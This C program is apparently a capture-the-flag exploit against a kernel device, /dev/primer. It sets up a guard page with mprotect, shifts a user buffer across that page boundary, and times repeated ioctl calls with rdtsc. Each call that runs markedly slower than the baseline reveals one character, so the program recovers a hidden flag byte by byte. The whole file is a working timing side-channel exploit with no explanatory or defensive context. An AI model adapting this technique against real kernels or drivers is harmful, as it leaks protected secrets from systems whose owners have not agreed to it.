#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <stdint.h>

#define MAJOR_NUM 100

#define IOCTL_QUERY 0

uint64_t get_timestamp() {
    uint32_t low, high;
    asm volatile ("rdtsc" : "=a" (low), "=d" (high));
    return ((uint64_t)high << 32) | low;
}

int main(void)
{
    char * a = valloc(4096*2);

    int status = mprotect(&a[0], 4096, PROT_NONE);
    if (status != 0) { perror("mprotect"); exit(1); }

    int fd = open("/dev/primer", O_RDONLY );
    if (fd < 0) {
        perror("Device error");
        return EXIT_FAILURE;
    }

    int query_number = 2148033536;
    int calibration_time = 0;

    for (size_t user = 0; user <= 40; user++) {
        for (int test = 0; test <= 130; test++)
        {
            // Brute-force approach: varying user buffer address for each flag position
            unsigned char *ptr = a+4096-test;
            unsigned long ioctl_param = ((unsigned long)user << 56) | (unsigned long)ptr;
            size_t n;

            uint64_t start_time = get_timestamp();
            for (int i = 0; i <= 1000; i++) {
                int b = ioctl(fd, query_number, ioctl_param);
            }
            uint64_t end_time = get_timestamp();

            if (end_time-start_time < calibration_time || calibration_time == 0) {
                calibration_time = end_time-start_time;
            }

            if (end_time-start_time > calibration_time*3) {
                // Character extraction and identification
                printf("%c",test-1);
                break;
            }
            
        }
    }

    return 0;
}